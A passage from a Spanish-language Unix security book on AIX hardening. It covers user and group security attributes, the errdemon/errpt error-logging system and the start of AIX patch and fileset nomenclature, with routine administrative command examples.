Esto puede parecer parad&#x00F3;jico pero no lo es en absoluto: los m&#x00E9;todos de&#xFB01;nidos en auth2 no
sustituyen a los de&#xFB01;nidos en auth1, sino que se utilizan de forma adicional para otorgar otros
privilegios a un usuario determinado; el caso t&#x02CA;&#x0131;pico puede ser el de Kerberos: cuando un usuario
se autentica correctamente en una m&#x00E1;quina, con su login y contrase~na, el m&#x00E9;todo secundario
puede solicitarle una clave adicional para otorgarle credenciales de Kerberos; si esta clave no es
correcta el usuario accede al sistema como m&#x00E1;quina aislada, pero sin las credenciales que le
autentiquen en el dominio. Adem&#x00E1;s, los m&#x00E9;todos de&#xFB01;nidos en auth2 permiten especi&#xFB01;car programas no
relacionados con la autenticaci&#x00F3;n, pero que nos interesa que se ejecuten cuando un usuario accede al
sistema.
<!--br/-->
<!--br/-->La &#x00FA;ltima directiva de /etc/security/user relacionada con la autenticaci&#x00F3;n de usuarios es SYSTEM, que
en AIX 4.x puede ser utilizada para describir diferentes m&#x00E9;todos de autenticaci&#x00F3;n: NONE (sin
autenticaci&#x00F3;n), &#x2018;files&#x2019;, si s&#x00F3;lo se efectua una autenticaci&#x00F3;n local basada en las claves almacenadas en
/etc/security/passwd, &#x2018;compat&#x2019;, si a lo anterior le a~nadimos un entorno NIS, y DCE, si estamos
trabajando con autenticaci&#x00F3;n en un entorno distribuido. Como medida de seguridad b&#x00E1;sica, la
propia IBM recomienda que el root de un sistema AIX s&#x00F3;lo se autentique a trav&#x00E9;s de &#xFB01;cheros de
contrase~nas locales (la entrada SYSTEM de la stanza del superusuario ha de tener como valor
&#x2018;files&#x2019;).
<!--br/-->
<!--br/-->Una vez que un usuario se ha autenticado correctamente y ha accedido al sistema entran en juego otra
serie de directivas que nos pueden resultar interesantes de cara a nuestra seguridad. La menos importante
es umask, que como su nombre indica de&#xFB01;ne, mediante tres d&#x02CA;&#x0131;gitos octales, la m&#x00E1;scara por defecto de cada
usuario; decimos que es la menos importante porque, como sucede en cualquier Unix, el usuario puede
modi&#xFB01;car ese valor por defecto siempre que lo desee, simplemente ejecutando la orden umask desde l&#x02CA;&#x0131;nea
de comandos.
<!--br/-->
<!--br/-->Dos entradas que tambi&#x00E9;n afectan a la seguridad de usuarios ya dentro del sistema son su y sugroups; la
primera, cuyo valor puede ser true o false (o sus equivalentes), indica si los usuarios de la m&#x00E1;quina
pueden ejecutar la orden su para cambiar su identidad a la del usuario en cuya stanza se ha de&#xFB01;nido la
directiva: ojo, no se trata de limitar la ejecuci&#x00F3;n de su a un usuario concreto, sino de limitar al resto la
posibiliad de convertirse en ese usuario a trav&#x00E9;s de este comando. Asignar a la directiva su el
valor de true puede ayudarnos a proteger ciertas cuentas especiales de la m&#x00E1;quina que no nos
interesa que sean alcanzadas de ninguna forma por el resto de usuarios. Por su parte, la segunda
entrada a la que hac&#x02CA;&#x0131;amos referencia, sugroups, de&#xFB01;ne los grupos cuyos miembros pueden
(o que no pueden, si precedemos su nombre por el s&#x02CA;&#x0131;mbolo &#x2018;!&#x2019;) acceder mediante la orden
su a una cuenta determinada, evidentemente si el valor de la directiva su de esa cuenta es
verdadero.
<!--br/-->

<!--br/-->Para &#xFB01;nalizar este punto vamos a comentar brevemente un &#x00FA;ltimo grupo de directivas dentro
del archivo /etc/security/user que de&#xFB01;nen caracter&#x02CA;&#x0131;sticas de los usuarios del sistema. En
primer lugar, admin de&#xFB01;ne el estado administrativo de un usuario: si es administrador o si
no lo es; en caso a&#xFB01;rmativo s&#x00F3;lo el root puede modi&#xFB01;car las caracter&#x02CA;&#x0131;sticas de ese usuario.
Independientemente del estado administrativo de un usuario, cada uno puede ser administrador de
grupos concretos (grupos que no sean administrativos, ya que en este caso, como sucede con la
de&#xFB01;nici&#x00F3;n de usuarios, s&#x00F3;lo el root puede modi&#xFB01;car sus par&#x00E1;metros); entra entonces en juego el
valor de admgroups, que indica los grupos (separados por comas) de los que el usuario es
administrador.
<!--br/-->
<!--br/-->Otra caracter&#x02CA;&#x0131;stica de cada usuario es la posibilidad del mismo de ejecutar tareas relacionadas con el SRC;
es controlada por la directiva daemon, que puede tomar el valor de verdadero o falso. La entrada registry
de&#xFB01;ne la forma de gestionar la autenticaci&#x00F3;n de un usuario concreto: en local (files) o en entornos
distribuidos (NIS o DCE). Por &#x00FA;ltimo, tpath marca las caracter&#x02CA;&#x0131;sticas del Trusted Path: nosak, si el Secure
Attention Key (recordemos, Ctrl-X Ctrl-R en AIX) no tiene efecto, on, si al pulsar el SAK se accede al
Trusted Path, always, si siempre que un usuario accee al sistema lo hace al Trusted Path, y &#xFB01;nalmente
notsh, que desconecta al usuario al pulsar Ctrl-X Ctrl-R, lo que implica que nunca puede estar en el
Trusted Path.
  </para></section><!--end subsection--><!--l. 937--><section 
role="subsection"><title><abbrev role="title-mark">11.4.8</abbrev><anchor 
   id="x1-17000011.4.8"  ></anchor>El &#xFB01;chero /etc/security/group</title>
<!--l. 938--><para>  En el archivo /etc/security/group se pueden de&#xFB01;nir atributos para cada uno de los grupos del sistema
(especi&#xFB01;cados, como en el resto de Unices, en el &#xFB01;chero /etc/group); de cara a la seguridad, son
principalmente dos los atributos que m&#x00E1;s nos interesan en un entorno convencional: admin y adms. El
primero de ellos, la directiva admin, es booleano (es decir, su valor puede ser &#x2018;true&#x2019; o &#x2018;false&#x2019;), y de&#xFB01;ne
el estado administrativo del grupo al que afecta. El que un grupo sea administrativo implica que s&#x00F3;lo el
administrador puede cambiar atributos del mismo, mientras que si no lo es aparte del root pueden hacerlo
los usuarios pertenecientes al grupo security; en este &#x00FA;ltimo caso entra en juego la directiva adms, que
de&#xFB01;ne los administradores de grupos no administrativos. Estos administradores de un grupo tienen
capacidad para ejecutar ciertas tareas sobre &#x00E9;l, como a~nadir o eliminar usuarios o administradores del
mismo.
<!--br/-->
<!--br/-->La stanza de un grupo determinado suele ser similar a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;pruebas:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;adms&#x00A0;=&#x00A0;root,toni
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;admin&#x00A0;=&#x00A0;false
</literallayout>
<!--l. 959--><para>Igual que existen &#x00F3;rdenes propias de AIX para consultar atributos de los usuarios o modi&#xFB01;carlos (lsuser,
chuser, rmuser&#x2026;), en el caso de los grupos existen comandos equivalentes: lsgroup, chgroup&#x2026;Su uso es
muy similar al de los primeros:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsgroup&#x00A0;pruebas
&#x00A0;pruebas&#x00A0;id=201&#x00A0;admin=false&#x00A0;users=&#x00A0;adms=root,toni
&#x00A0;bruja:/#
</literallayout>
<!--l. 970--><para>Los atributos de grupo que aparecen en el archivo /etc/security/group se denominan, como en el caso de
los usuarios y el &#xFB01;chero /etc/security/user, extendidos; los b&#x00E1;sicos se encuentran en el mismo lugar que
en cualquier otro Unix: en /etc/group, donde se de&#xFB01;nen los grupos, su clave, su GID y los usuarios que
pertenecen a cada uno de ellos de forma secundaria. En AIX, la pertenencia al grupo especial
&#x2018;system&#x2019; permite a un usuario realizar ciertas tareas administrativas sin necesidad de privilegios
de administrador. Algo similar sucede con el grupo &#x2018;security&#x2019;, que permite a sus usuarios
gestionar parcialmente algunos aspectos de la seguridad en el sistema (les proporciona acceso al
directorio /etc/security/ y su contenido, para, por ejemplo, modi&#xFB01;car atributos de los usuarios
no administrativos); por defecto, en AIX el grupo &#x2018;staff&#x2019; es el que engloba a los usuarios
normales.
  </para></section><!--end subsection--></section><!--end section--><!--l. 983--><section 
role="section"><title><abbrev role="title-mark">11.5</abbrev><anchor 
   id="x1-17100011.5"  ></anchor>El sistema de log</title>
<!--l. 984--><para>  Al igual que sucede en cualquier sistema Unix, en AIX la informaci&#x00F3;n y los errores generados por eventos
en el sistema son gestionados por el demonio syslogd, que en funci&#x00F3;n de su con&#xFB01;guraci&#x00F3;n (en el archivo
/etc/syslogd.conf) env&#x02CA;&#x0131;a sus registros a consola, a un &#xFB01;chero, a un programa, a otro sistema&#x2026;tal y como
se explica en el cap&#x02CA;&#x0131;tulo dedicado a la auditor&#x02CA;&#x0131;a de sistemas Unix. No obstante, adem&#x00E1;s de
syslogd, AIX proporciona otro mecanismo para la gesti&#x00F3;n de errores y mensajes del hardware, del
sistema operativo y de las aplicaciones, ofreciendo una informaci&#x00F3;n muy valiosa para determinar
cualquier tipo de problemas en el entorno (<citation>[?]</citation>); mientras que por defecto syslogd no realiza
ning&#x00FA;n tipo de registro en AIX, este sistema no necesita ning&#x00FA;n tipo de con&#xFB01;guraci&#x00F3;n adicional
para comenzar a realiza su trabajo. Adem&#x00E1;s, viene &#x2018;de serie&#x2019;, ya que este mecanismo adicional
forma parte de los paquetes bos.rte y bos.sysmgt.serv<informalequation><graphic 
fileref="unixsec199x.gif"></graphic></informalequation>aid, instalados por defecto con el
operativo:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/etc#&#x00A0;lslpp&#x00A0;-l&#x00A0;bos.rte&#x00A0;bos.sysmgt.serv&#x005F;aid
&#x00A0;&#x00A0;&#x00A0;Fileset&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Level&#x00A0;&#x00A0;State&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Description
&#x00A0;&#x00A0;&#x00A0;--------------------------------------------------------------------------
&#x00A0;Path:&#x00A0;/usr/lib/objrepos
&#x00A0;&#x00A0;&#x00A0;bos.rte&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.10&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;Base&#x00A0;Operating&#x00A0;System&#x00A0;Runtime
&#x00A0;&#x00A0;&#x00A0;bos.sysmgt.serv&#x005F;aid&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.50&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;Software&#x00A0;Error&#x00A0;Logging&#x00A0;and
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Dump&#x00A0;Service&#x00A0;Aids
&#x00A0;
&#x00A0;Path:&#x00A0;/etc/objrepos
&#x00A0;&#x00A0;&#x00A0;bos.rte&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.0&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;Base&#x00A0;Operating&#x00A0;System&#x00A0;Runtime
&#x00A0;&#x00A0;&#x00A0;bos.sysmgt.serv&#x005F;aid&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.50&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;Software&#x00A0;Error&#x00A0;Logging&#x00A0;and
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Dump&#x00A0;Service&#x00A0;Aids
&#x00A0;bruja:/etc#
</literallayout>
<!--l. 1016--><para>Al arrancar una m&#x00E1;quina AIX desde /etc/inittab se invoca a /sbin/rc.boot, shellscript donde se inicializa
el demonio errdemon, encargado de monitorizar cont&#x02CA;&#x0131;nuamente el archivo /dev/error y crear los registros
de error en el &#xFB01;chero correspondiente; a diferencia de syslogd, errdemon no escribe una entrada cada vez
que se registra un evento, sino que lo hace mediante bu&#xFB00;ers tal y como se le indica en su base de datos de
noti&#xFB01;caci&#x00F3;n de errores, /etc/objrepos/errnotify. Adem&#x00E1;s, el registro de errores por defecto se
mantiene en /var/adm/ras/errlog, mientras que el &#x00FA;ltimo log generado se guarda en memoria
NVRAM de forma que en el arranque del sistema se a~nade al registro cuando se inicializa el
demonio.
<!--br/-->
<!--br/-->Los registros guardados por errdemon est&#x00E1;n en modo binario (a diferencia de los logs habituales en Unix)
por defecto, como hemos comentado, dentro del &#xFB01;chero /var/adm/ras/errlog; de esta forma, para
visualizarlos necesitaremos ciertas herramientas que vienen con el sistema; podemos utilizar
desde l&#x02CA;&#x0131;nea de comandos la orden errpt o bien &#x2013; como siempre en AIX &#x2013; invocarla desde
SMIT. En cualquier caso, mediante esta herramienta se genera en tiempo real un informe de
errores:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;errpt&#x00A0;|head&#x00A0;-2
&#x00A0;IDENTIFIER&#x00A0;TIMESTAMP&#x00A0;&#x00A0;T&#x00A0;C&#x00A0;RESOURCE&#x005F;NAME&#x00A0;&#x00A0;DESCRIPTION
&#x00A0;AA8AB241&#x00A0;&#x00A0;&#x00A0;0506081102&#x00A0;T&#x00A0;O&#x00A0;OPERATOR&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;OPERATOR&#x00A0;NOTIFICATION
&#x00A0;bruja:/#
</literallayout>
<!--l. 1044--><para>Como podemos ver, cada l&#x02CA;&#x0131;nea mostrada por esta orden es uno de los registros procesados; la primera
columna es un identi&#xFB01;cador de error &#x00FA;nico y la segunda indica la hora en que se gener&#x00F3; el mismo en formato
mmddhhmmyy (mes, d&#x02CA;&#x0131;a, hora, minuto y a~no). La tercera describe el tipo de error registrado: una &#x2018;T&#x2019; indica
que es temporal, una &#x2018;P&#x2019; que es permanente y una &#x2018;U&#x2019; que es desconocido. La cuarta columna de&#xFB01;ne la
clase del error (&#x2018;S&#x2019; para errores software, &#x2018;H&#x2019; para hardware y &#x2018;O&#x2019; para entradas generadas mediante
errlogger, como veremos despu&#x00E9;s). Finalmente, la quinta columna indica el recurso afectado, y la
&#x00FA;ltima una descripci&#x00F3;n del error. Si pensamos que el formato es algo complicado de interpretar a
simple vista (quiz&#x00E1;s tengamos raz&#x00F3;n), podemos utilizar la opci&#x00F3;n &#x2018;-a&#x2019; de la orden, que muestra
los registros con un mayor nivel de detalle, hasta el punto de indicar las posibles causas del
problema y su soluci&#x00F3;n (aunque realmente esta informaci&#x00F3;n no es tan &#x00FA;til como pueda parecer en
principio):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;errpt&#x00A0;-a|head&#x00A0;-36
&#x00A0;-------------------------------------------------------------------------
&#x00A0;LABEL:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;SRC
&#x00A0;IDENTIFIER:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;E18E984F
&#x00A0;
&#x00A0;Date/Time:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mon&#x00A0;May&#x00A0;&#x00A0;6&#x00A0;07:02:05
&#x00A0;Sequence&#x00A0;Number:&#x00A0;30479
&#x00A0;Machine&#x00A0;Id:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;000000375C00
&#x00A0;Node&#x00A0;Id:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bruja
&#x00A0;Class:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;S
&#x00A0;Type:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PERM
&#x00A0;Resource&#x00A0;Name:&#x00A0;&#x00A0;&#x00A0;SRC
&#x00A0;
&#x00A0;Description
&#x00A0;SOFTWARE&#x00A0;PROGRAM&#x00A0;ERROR
&#x00A0;
&#x00A0;Probable&#x00A0;Causes
&#x00A0;APPLICATION&#x00A0;PROGRAM
&#x00A0;
&#x00A0;Failure&#x00A0;Causes
&#x00A0;SOFTWARE&#x00A0;PROGRAM
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Recommended&#x00A0;Actions
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PERFORM&#x00A0;PROBLEM&#x00A0;RECOVERY&#x00A0;PROCEDURES
&#x00A0;
&#x00A0;Detail&#x00A0;Data
&#x00A0;SYMPTOM&#x00A0;CODE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;SOFTWARE&#x00A0;ERROR&#x00A0;CODE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;-9017
&#x00A0;ERROR&#x00A0;CODE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;9
&#x00A0;DETECTING&#x00A0;MODULE
&#x00A0;&#x2019;srchevn.c&#x2019;@line:&#x2019;288&#x2019;
&#x00A0;FAILING&#x00A0;MODULE
&#x00A0;qdaemon
&#x00A0;-------------------------------------------------------------------------
&#x00A0;bruja:/#
</literallayout>
<!--l. 1100--><para>El archivo errlog es un registro circular, es decir, almacena tantas entradas como se de&#xFB01;ne al arrancar el
demonio errdemon. Al llegar una nueva entrada, se almacena primero en un bu&#xFB00;er intermedio para
minimizar la probabilidad de p&#x00E9;rdida del registro, y a continuaci&#x00F3;n se pasa al &#xFB01;chero errlog; en este punto,
si se va a sobrepasar el tama~no m&#x00E1;ximo del archivo, se elimina la primera entrada registrada. Podemos
consultar los par&#x00E1;metros de con&#xFB01;guraci&#x00F3;n actuales mediante errdemon, y quiz&#x00E1;s nos interese tambi&#x00E9;n
modi&#xFB01;car alguno de ellos en el arranque del sistema; por ejemplo, <citation>[?]</citation> recomienda incrementar
el tama~no por defecto de los bu&#xFB00;ers y del archivo de log para obtener un mejor registro de
auditor&#x02CA;&#x0131;a:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;/usr/lib/errdemon&#x00A0;-l
&#x00A0;Error&#x00A0;Log&#x00A0;Attributes
&#x00A0;---------------------------------------------
&#x00A0;Log&#x00A0;File&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/ras/errlog
&#x00A0;Log&#x00A0;Size&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1048576&#x00A0;bytes
&#x00A0;Memory&#x00A0;Buffer&#x00A0;Size&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8192&#x00A0;bytes
&#x00A0;bruja:/#&#x00A0;/usr/lib/errdemon&#x00A0;-s4194304&#x00A0;-B32768
&#x00A0;The&#x00A0;error&#x00A0;log&#x00A0;memory&#x00A0;buffer&#x00A0;size&#x00A0;you&#x00A0;supplied&#x00A0;will&#x00A0;be&#x00A0;rounded&#x00A0;up
&#x00A0;to&#x00A0;a&#x00A0;multiple&#x00A0;of&#x00A0;4096&#x00A0;bytes.
&#x00A0;bruja:/#&#x00A0;/usr/lib/errdemon&#x00A0;-l
&#x00A0;Error&#x00A0;Log&#x00A0;Attributes
&#x00A0;---------------------------------------------
&#x00A0;Log&#x00A0;File&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/ras/errlog
&#x00A0;Log&#x00A0;Size&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4194304&#x00A0;bytes
&#x00A0;Memory&#x00A0;Buffer&#x00A0;Size&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;bytes
&#x00A0;bruja:/#
</literallayout>
<!--l. 1131--><para>Otra herramienta interesante para trabajar con el sistema de registro de AIX es errlogger; la
funcionalidad de la misma es similar a la de la orden logger en otros Unices: a~nadir entradas al
&#xFB01;chero de log desde l&#x02CA;&#x0131;nea de comandos, por ejemplo a la hora de registrar eventos desde un
shellscript:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;errlogger&#x00A0;Mensaje&#x00A0;de&#x00A0;prueba
&#x00A0;bruja:/#&#x00A0;errpt&#x00A0;|head&#x00A0;-2
&#x00A0;IDENTIFIER&#x00A0;TIMESTAMP&#x00A0;&#x00A0;T&#x00A0;C&#x00A0;RESOURCE&#x005F;NAME&#x00A0;&#x00A0;DESCRIPTION
&#x00A0;AA8AB241&#x00A0;&#x00A0;&#x00A0;0506081102&#x00A0;T&#x00A0;O&#x00A0;OPERATOR&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;OPERATOR&#x00A0;NOTIFICATION
&#x00A0;bruja:/#&#x00A0;errpt&#x00A0;-a&#x00A0;|head&#x00A0;-25
&#x00A0;-------------------------------------------------------------------------
&#x00A0;LABEL:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;OPMSG
&#x00A0;IDENTIFIER:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;AA8AB241
&#x00A0;
&#x00A0;Date/Time:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mon&#x00A0;May&#x00A0;&#x00A0;6&#x00A0;08:11:54
&#x00A0;Sequence&#x00A0;Number:&#x00A0;30480
&#x00A0;Machine&#x00A0;Id:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;000000375C00
&#x00A0;Node&#x00A0;Id:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bruja
&#x00A0;Class:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;O
&#x00A0;Type:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TEMP
&#x00A0;Resource&#x00A0;Name:&#x00A0;&#x00A0;&#x00A0;OPERATOR
&#x00A0;
&#x00A0;Description
&#x00A0;OPERATOR&#x00A0;NOTIFICATION
&#x00A0;
&#x00A0;User&#x00A0;Causes
&#x00A0;ERRLOGGER&#x00A0;COMMAND
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Recommended&#x00A0;Actions
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;REVIEW&#x00A0;DETAILED&#x00A0;DATA
&#x00A0;
&#x00A0;Detail&#x00A0;Data
&#x00A0;MESSAGE&#x00A0;FROM&#x00A0;ERRLOGGER&#x00A0;COMMAND
&#x00A0;Mensaje&#x00A0;de&#x00A0;prueba
&#x00A0;-------------------------------------------------------------------------
&#x00A0;bruja:/#
</literallayout>
<!--l. 1171--><para>AIX ofrece m&#x00E1;s herramientas para realizar diferente tareas sobre su sistema nativo de log: eliminar entradas
(errclear), instalar nuevas entradas en el archivo de con&#xFB01;guraci&#x00F3;n (errinstall), detener el demonio
errdemon (errstop); para obtener informaci&#x00F3;n adicional podemos consultar el cap&#x02CA;&#x0131;tulo 10 de <citation>[?]</citation>. El
sistema de log en AIX es una de las caracter&#x02CA;&#x0131;sticas m&#x00E1;s potentes que el operativo nos ofrece,
proporcionando un nivel de detalle y granularidad en la clasi&#xFB01;caci&#x00F3;n de eventos muy superior al de
syslogd; no obstante, la cantidad de informaci&#x00F3;n registrada, y el hecho de que no existan herramientas &#x2018;de
serie&#x2019; (realmente s&#x02CA;&#x0131; que las hay, en muchos casos simples scripts desarrolladas por terceros) que informen
de alg&#x00FA;n modo especial ante errores graves, hacen que no se consulte mucho el log y se pierdan entradas que
son importantes, no s&#x00F3;lo en lo referente a la seguridad del sistema sino tambi&#x00E9;n en lo que concierne a su
estabilidad.
  </para></section><!--end section--><!--l. 1185--><section 
role="section"><title><abbrev role="title-mark">11.6</abbrev><anchor 
   id="x1-17200011.6"  ></anchor>El sistema de parcheado</title>
<!--l. 1186--><para>  Antes de empezar a hablar sobre el parcheado y la actualizaci&#x00F3;n de un sistema AIX es conveniente aclarar
un poco la nomenclatura que IBM sigue en su distribuci&#x00F3;n de su software (<citation>[?]</citation>); el formato instalable m&#x00E1;s
peque~no se denomina &#xFB01;leset, y hace referencia a una serie de archivos que realizan una cierta funci&#x00F3;n en la
m&#x00E1;quina (por ejemplo, la implantaci&#x00F3;n de mecanismos de seguridad al subsistema de red, como veremos
despu&#x00E9;s). Para actualizar los &#xFB01;lesets existen actualizaciones de este formato, que se pueden diferenciar de la
versi&#x00F3;n original porque su versi&#x00F3;n acaba en un n&#x00FA;mero diferente de &#x2018;0&#x2019; (por ejemplo, un &#xFB01;leset puede estar
marcado como 4.3.3.0 y una actualizaci&#x00F3;n como 4.3.3.4). Los &#xFB01;lesets se agrupan en diferentes paquetes

(packages) en funci&#x00F3;n de su cometido (por ejemplo, el package que agrupa a todos los &#xFB01;lesets
relacionados con el sistema de red de AIX), y a su vez estos packages se agrupan en LPPs (Licensed
Program Product), colecciones de software establecido en una gran &#x00E1;rea. La nomenclatura de la
unidad software m&#x00E1;s peque~na de&#xFB01;ne tanto el &#xFB01;leset como el package y el LPP al que pertenece:
por ejemplo, bos.net.ipsec.rte es un &#xFB01;leset incluido en el paquete bos.net, que a su vez
pertenece al LPP bos (Basic Operating System). Aparte de la anterior clasi&#xFB01;caci&#x00F3;n, los parches tal
y como los conocemos en Unix se denominan PTFs (Program Temporary Fix), y cada uno
de ellos viene referenciado por un n&#x00FA;mero &#x00FA;nico llamado APAR (Authorized Program Analysis
Report).
<!--br/-->
<!--br/-->La distribuci&#x00F3;n de todo este software para AIX, tanto paquetes originales como actualizaciones, se realiza
en un formato de &#xFB01;chero denominado bff (Backup File Format); este formato es el cl&#x00E1;sico de la orden
backup de muchos Unices, por lo que puede ser instalado mediante restore, aunque su utilizaci&#x00F3;n no es en
absoluto recomendable: para instalar un nuevo paquete o actualizar uno existente hemos de
utilizar el comando installp o, m&#x00E1;s habitualmente, smit. Mediante &#x2018;lslpp -L&#x2019; podemos ver
las versiones del software instalado en un sistema AIX, y con &#x2018;lslpp -h&#x2019; un hist&#x00F3;rico de sus
versiones:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lslpp&#x00A0;-L&#x00A0;Java130.rte.lib
&#x00A0;&#x00A0;&#x00A0;Fileset&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Level&#x00A0;&#x00A0;State&#x00A0;&#x00A0;Description
&#x00A0;&#x00A0;&#x00A0;--------------------------------------------------------------------------
